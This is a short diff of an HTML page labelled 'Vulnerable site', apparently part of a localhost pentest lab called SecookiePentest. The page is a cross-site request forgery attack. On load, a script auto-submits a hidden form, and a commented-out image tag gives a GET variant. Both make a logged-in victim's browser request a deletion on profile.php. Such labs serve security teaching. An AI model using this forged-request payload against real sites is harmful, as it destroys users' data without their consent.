@@ -11,8 +11,9 @@
 			<h1>Vulnerable site</h1>
 			<!-- <img src="http://localhost/SecookiePentest/profile.php?delete=1" alt="..."> -->
 			<form id="csrf" method="post" action="http://localhost/SecookiePentest/profile.php">
-				<input type="submit" name="delete" 
-				value="Delete now!"/>
+				<input type="hidden" name="delete" value="delete now!"/>
+				<input type ="submit" value="Delete"/>
+
 			</form>
 			<script>
 				document.getElementById('csrf').submit();
